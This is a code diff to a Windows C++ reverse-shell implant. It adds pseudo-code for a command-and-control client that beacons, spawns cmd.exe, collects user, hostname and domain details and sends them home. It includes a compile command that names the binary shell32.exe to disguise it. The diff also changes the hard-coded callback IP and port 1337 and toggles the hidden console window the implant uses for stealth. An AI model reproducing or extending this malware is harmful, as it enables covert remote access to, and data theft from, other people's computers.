@@ -8,8 +8,48 @@
 #pragma comment(lib, "Ws2_32.lib")
 #define DEFAULT_BUFLEN 1024
 
+// credit to paranoid ninja
+
+// to compile:
+// i686-w64-mingw32-g++ wsarev.cpp -o shell32.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+
+// We can try and use two iterations of this shell. Keep it in an "inactive state" where batch-commands (using Shell), profiling/information-gathering,
+// and beaconing is possible. This will preferably use the WINAPI functions (stealthy?). Then, we can implement the 'interaction' part of the shell, 
+// in which the cmd.exe process is executes.
+
+// Pseudo-code/outline
+/* 
+start program:
+    start socket, init connection
+    listen for incoming data: if cant connect retry in random interval range 5-40 seconds
+        if data = shell:
+            spawn cmd.exe 
+            -> upon exit, close process. 
+            -> send message saying process closed (C2 catches message and closes interaction successfully)
+        else if data = batch:
+            start secondary listener for follow-up data (ie. commands for shell exec, profiling)
+            wait for 'quit' message which exits listening 'loop?'
+        else if data = exit:
+            kill socket
+            kill process
+            exit(0)
+        else if data = info:
+            get user, hostname, process name, users logged in, ip address, domain name, etc.
+            make pretty
+            send home
+        
+
+Notes and Questions:
+    - How much of this is can be done with the WinAPI?
+    - 
+*/
+
+
+
+// Functions and stuff
+
 // Debug headers
-// #include <iostream>
+ #include <iostream>
 
 void exec(char *returnval, int returnsize, char *fileexec)
 {
@@ -36,25 +76,34 @@ void hostname(char *returnval, int returnsize)
     GetComputerName(returnval, &bufferlen);
 }
 
-void pwd(char *returnval, int returnsize) //Module 2
+void pwd(char *returnval, int returnsize) // Module 2
 {
     TCHAR tempvar[MAX_PATH];
     GetCurrentDirectory(MAX_PATH, tempvar);
     strcat(returnval, tempvar);
 }
 
+
+
+// Main Function and connection
+
 void RevShell()
 {
+
+    // Setup connection (WinAPI)
     WSADATA wsaver;
     WSAStartup(MAKEWORD(2, 2), &wsaver);
     SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
     sockaddr_in addr;
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = inet_addr("192.168.17.10");
+    addr.sin_addr.s_addr = inet_addr("192.168.75.100");
     addr.sin_port = htons(1337);
 
+    // Init connection through socket using info
     if (connect(tcpsock, (SOCKADDR *)&addr, sizeof(addr)) == SOCKET_ERROR)
     {
+        // Error? close and exit
         closesocket(tcpsock);
         WSACleanup();
         exit(0);
@@ -151,7 +200,7 @@ int main()
     HWND stealth;
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
-    ShowWindow(stealth, 0);
+    ShowWindow(stealth, 1);
     RevShell();
     return 0;
 }
